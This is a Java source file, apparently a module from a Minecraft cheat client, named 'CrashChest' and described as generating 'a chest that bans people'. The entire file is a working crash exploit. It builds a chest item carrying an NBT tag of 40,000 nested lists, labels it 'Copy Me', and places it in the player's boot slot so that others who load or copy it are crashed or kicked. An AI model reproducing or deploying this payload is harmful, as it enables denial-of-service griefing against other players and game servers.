/*
 *hello
 * Copyright (c) 2021 Meteor Development.
 */

package minegame159.meteorclient.modules.crash;

import minegame159.meteorclient.modules.Category;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.item.ItemStack;
import net.minecraft.block.Blocks;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.text.LiteralText;

public class CrashChest extends Module {
public CrashChest(Category category, String name, String description) {
		super(category, name, description);
}

    public CrashChest() {
        super(Category.Crash, "CrashChest", "Generates a chest that  bans people");
    }

    	@Override
    	public void onActivate()
    	{
    		if(!mc.player.abilities.creativeMode)
    		{
    			ChatUtils.error("Creative mode only.");
    			toggle(false);
    			return;
    		}
    		
    		if(!mc.player.inventory.getArmorStack(0).isEmpty())
    		{
    			ChatUtils.error("Please clear your shoes slot.");
    			toggle(false);
    			return;
    		}
    		
    		// generate item
    		ItemStack stack = new ItemStack(Blocks.CHEST);
    		CompoundTag nbtCompound = new CompoundTag();
    		ListTag nbtList = new ListTag();
    		for(int i = 0; i < 40000; i++)
    			nbtList.add(new ListTag());
    		nbtCompound.put("SteveHClient", nbtList);
    		stack.setTag(nbtCompound);
    		stack.setCustomName(new LiteralText("Copy Me"));
    		
    		// give item
    		mc.player.inventory.armor.set(0, stack);
    		ChatUtils.info("Item has been placed in your shoes slot.");
    		toggle(false);
    	}
    }
